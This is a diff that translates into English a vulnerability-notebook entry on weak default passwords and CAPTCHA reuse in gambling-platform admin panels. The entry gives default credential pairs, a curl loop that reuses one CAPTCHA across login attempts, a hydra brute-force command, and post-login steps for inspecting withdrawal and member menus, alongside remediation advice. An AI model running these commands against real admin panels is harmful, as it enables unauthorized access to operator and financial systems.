@@ -1,65 +1,65 @@
 ﻿---
-title: 运营后台弱口令 + 验证码复用（博彩站点最常见入口）
-cve: 无（业务逻辑）
+title: Weak operator-admin passwords + CAPTCHA reuse (the most common entry point on gambling sites)
+cve: None (business logic)
 severity: critical
 cvss: 9.1
-product: 自研运营/代理后台（包网系统）
-versions: 任意
+product: Custom operator/agent admin panels (turnkey gambling platforms)
+versions: Any
 ports: 80, 443, 8080, 8443
-keywords: 弱口令, 后台, 验证码复用, 运营商, 包网, 登录
-entry: /admin /manage /agent 的登录接口
+keywords: weak passwords, admin panel, CAPTCHA reuse, operator, turnkey gambling platform, login
+entry: Login endpoints for /admin /manage /agent
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic flaws; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 /admin  /manage  /operator  /agent  /backend
 POST /api/admin/login  {"username":"admin","password":"...","captcha":"..."}
 ```
 
-包网系统后台常见默认：`admin/admin`、`admin/123456`、`admin888`、`operator/operator`、`test/test123`；验证码常**校验后不失效**。
+Common defaults in turnkey gambling admin panels: `admin/admin`, `admin/123456`, `admin888`, `operator/operator`, `test/test123`; CAPTCHAs often **remain valid after verification**.
 
-## 前置条件
+## Prerequisites
 
-- 后台入口暴露（不限于内网）；
-- 有可复用的验证码接口（`/api/captcha`）。
+- An exposed admin entry point (not restricted to the internal network);
+- A CAPTCHA endpoint that allows reuse (`/api/captcha`).
 
 ## PoC
 
 ```bash
-# 1) 拿一次验证码（记下 cookie 与 code 的对应关系）
+# 1) Fetch a CAPTCHA once (record the cookie-to-code association)
 curl -s -c /tmp/c.txt 'https://target/api/captcha' -o /tmp/cap.json && cat /tmp/cap.json
 
-# 2) 用同一 code 连续试口令：不换 code 就能一直试 = 复用漏洞
+# 2) Try passwords repeatedly with the same code: continued attempts without changing the code = reuse flaw
 for p in admin admin123 123456 admin888 operator888; do
   curl -s -b /tmp/c.txt -X POST 'https://target/api/admin/login' \
     -H 'Content-Type: application/json' \
-    -d "{\"username\":\"admin\",\"password\":\"$p\",\"captcha\":\"<同一code>\"}" \
+    -d "{\"username\":\"admin\",\"password\":\"$p\",\"captcha\":\"<same-code>\"}" \
     -o /dev/null -w "$p %{http_code}\n"
 done
-# 判定：多次请求都返回 200/{"code":0} 系列（不是验证码错误）= 复用成立
+# Confirmation: repeated requests return 200/{"code":0}-type responses (not CAPTCHA errors) = reuse confirmed
 ```
 
 ```bash
-# 3) 爆破（限速，20 次/分钟以内）
+# 3) Brute force (rate-limited to no more than 20 attempts/minute)
 hydra -l admin -P /usr/share/wordlists/rockyou.txt target https-post-form \
-  "/api/admin/login:username=^USER^&password=^PASS^&captcha=8888:F=验证码错误"
+  "/api/admin/login:username=^USER^&password=^PASS^&captcha=8888:F=CAPTCHA error"
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先确认验证码是否失效（第 2 步）；
-2. 有复用就小字典试（10~20 个常见口令足够）；
-3. 进后台先看"提现审核""会员管理"两个菜单，确认权限层级；
-4. 证据：一次成功登录的请求+响应（脱敏 cookie）。
+1. First check whether the CAPTCHA is invalidated (step 2);
+2. If reusable, try a small dictionary (10–20 common passwords are enough);
+3. After logging into the admin panel, first inspect "Withdrawal Review" and "Member Management" to determine the privilege level;
+4. Evidence: one successful login request + response (redact the cookie).
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 验证码一次性 + 5 分钟过期；登录失败计数按账号+IP；后台限 IP 白名单。
-- 强制管理员口令强度 + 2FA。
+- Make CAPTCHAs single-use with a 5-minute expiry; count failed logins by account + IP; restrict admin access to an IP allowlist.
+- Enforce strong administrator passwords + 2FA.
 
-## 参考
+## References
 
-- OWASP WSTG-ATHN-01；常见包网后台口令样本。
+- OWASP WSTG-ATHN-01; common password samples for turnkey gambling admin panels.
